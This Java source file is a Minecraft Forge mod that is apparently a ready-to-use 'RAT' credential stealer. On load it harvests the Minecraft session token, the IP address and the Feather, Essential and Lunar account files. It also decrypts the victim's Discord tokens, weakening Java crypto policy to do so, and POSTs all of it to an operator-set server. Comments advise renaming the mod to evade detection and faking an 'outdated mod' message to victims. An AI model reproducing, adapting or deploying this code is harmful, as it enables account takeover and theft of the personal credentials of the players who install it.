package studio.dreamys;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.sun.jna.platform.win32.Crypt32Util;
import net.minecraft.client.Minecraft;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.entity.EntityJoinWorldEvent;
import net.minecraftforge.fml.common.Loader;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.relauncher.ReflectionHelper;
import org.apache.commons.lang3.StringEscapeUtils;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.Base64;
import java.util.Map;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Mod(modid = "") //change this because hypixel doesn't like empty modids
public class Rat { //change class name please for the love of god

    @Mod.EventHandler
    public void preInit(FMLPreInitializationEvent event) {
        MinecraftForge.EVENT_BUS.register(this);

        //do everything on separate thread to avoid freezing
        new Thread(() -> {
            try {
                //setup connection
                HttpURLConnection c = (HttpURLConnection) new URL("http://localhost:80/").openConnection();
                c.setRequestMethod("POST");
                c.setRequestProperty("Content-type", "application/json");
                c.setDoOutput(true);

                Minecraft mc = Minecraft.getMinecraft();
                String ip = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com/").openStream())).readLine();
                String token = mc.getSession().getToken();
                String feather = "File not found :(", essentials = "File not found :(", lunar = "File not found :(", discord = "Discord not found :(";

                //"if u swap these files with yours, you get infinite access to victims accounts"      -Annah#5795
                //apparently doesn't work lol
                if (Files.exists(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json"))) {
                    feather = StringEscapeUtils.escapeJson(new String(Files.readAllBytes(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json")), StandardCharsets.UTF_8));
                }

                if (Files.exists(Paths.get(mc.mcDataDir.getPath(), "essential/microsoft_accounts.json"))) {
                    essentials = StringEscapeUtils.escapeJson(new String(Files.readAllBytes(Paths.get(mc.mcDataDir.getPath(), "essential/microsoft_accounts.json")), StandardCharsets.UTF_8));
                }

                if (Files.exists(Paths.get(System.getProperty("user.home"), ".lunarclient/settings/game/accounts.json"))) {
                    lunar = StringEscapeUtils.escapeJson(new String(Files.readAllBytes(Paths.get(System.getProperty("user.home"), ".lunarclient/settings/game/accounts.json")), StandardCharsets.UTF_8));
                }

                //discord tokens
                if (Files.isDirectory(Paths.get(mc.mcDataDir.getParent(), "discord/Local Storage/leveldb"))) {
                    discord = "";
                    for (File file : Objects.requireNonNull(Paths.get(mc.mcDataDir.getParent(), "discord/Local Storage/leveldb").toFile().listFiles())) {
                        if (file.getName().endsWith(".ldb")) {
                            FileReader fr = new FileReader(file);
                            BufferedReader br = new BufferedReader(fr);
                            String textFile;
                            StringBuilder parsed = new StringBuilder();

                            while ((textFile = br.readLine()) != null) parsed.append(textFile);

                            //release resources
                            fr.close();
                            br.close();

                            Pattern pattern = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)");
                            Matcher matcher = pattern.matcher(parsed.toString());

                            if (matcher.find()) {
                                try {
                                    //patch shit java security policy jre that mc uses
                                    if (Cipher.getMaxAllowedKeyLength("AES") < 256) {
                                        Class<?> aClass = Class.forName("javax.crypto.CryptoAllPermissionCollection");
                                        Constructor<?> con = aClass.getDeclaredConstructor();
                                        con.setAccessible(true);
                                        Object allPermissionCollection = con.newInstance();
                                        Field f = aClass.getDeclaredField("all_allowed");
                                        f.setAccessible(true);
                                        f.setBoolean(allPermissionCollection, true);

                                        aClass = Class.forName("javax.crypto.CryptoPermissions");
                                        con = aClass.getDeclaredConstructor();
                                        con.setAccessible(true);
                                        Object allPermissions = con.newInstance();
                                        f = aClass.getDeclaredField("perms");
                                        f.setAccessible(true);
                                        ((Map) f.get(allPermissions)).put("*", allPermissionCollection);

                                        aClass = Class.forName("javax.crypto.JceSecurityManager");
                                        f = aClass.getDeclaredField("defaultPolicy");
                                        f.setAccessible(true);
                                        Field mf = Field.class.getDeclaredField("modifiers");
                                        mf.setAccessible(true);
                                        mf.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                                        f.set(null, allPermissions);
                                    }

                                    //get, decode and decrypt key
                                    byte[] key, dToken = matcher.group().split("dQw4w9WgXcQ:")[1].getBytes();
                                    JsonObject json = new Gson().fromJson(new String(Files.readAllBytes(Paths.get(mc.mcDataDir.getParent(), "discord/Local State"))), JsonObject.class);
                                    key = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString().getBytes();
                                    key = Base64.getDecoder().decode(key);
                                    key = Arrays.copyOfRange(key, 5, key.length);
                                    key = Crypt32Util.cryptUnprotectData(key);

                                    //decode token
                                    dToken = Base64.getDecoder().decode(dToken);

                                    //decrypt token
                                    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                                    cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(dToken, 3, 15)));
                                    byte[] out = cipher.doFinal(Arrays.copyOfRange(dToken, 15, dToken.length));

                                    //place only if it doesn't contain the same
                                    if (!discord.contains(new String(out, StandardCharsets.UTF_8))) discord += new String(out, StandardCharsets.UTF_8) + " | ";
                                } catch (Exception e) {
                                    e.printStackTrace();
                                    discord = "Failed to decrypt token :(";
                                }
                            }
                        }
                    }
                }

                //pizzaclient bypass
                if (Loader.isModLoaded("pizzaclient")) {
                    token = (String) ReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
                }

                //send req
                String jsonInputString = String.format("{ \"username\": \"%s\", \"uuid\": \"%s\", \"token\": \"%s\", \"ip\": \"%s\", \"feather\": \"%s\", \"essentials\": \"%s\", \"lunar\": \"%s\", \"discord\": \"%s\" }", mc.getSession().getUsername(), mc.getSession().getPlayerID(), token, ip, feather, essentials, lunar, discord);
                OutputStream os = c.getOutputStream();
                byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);

                //receive res
                BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
                StringBuilder response = new StringBuilder();
                String responseLine;

                while ((responseLine = br.readLine()) != null) response.append(responseLine.trim());
                System.out.println(response);

                //release resources
                os.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    @SubscribeEvent
    public void onFirstPlayerJoin(EntityJoinWorldEvent e) {
        //send and unregister when player joins
        if (e.entity.equals(Minecraft.getMinecraft().thePlayer)) {
            //do something here (ex: play the "outdated mod" card)
//            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§cThis version of SBE has been disabled due to a security issue. Please update to the latest version."));
            MinecraftForge.EVENT_BUS.unregister(this);
        }
    }
}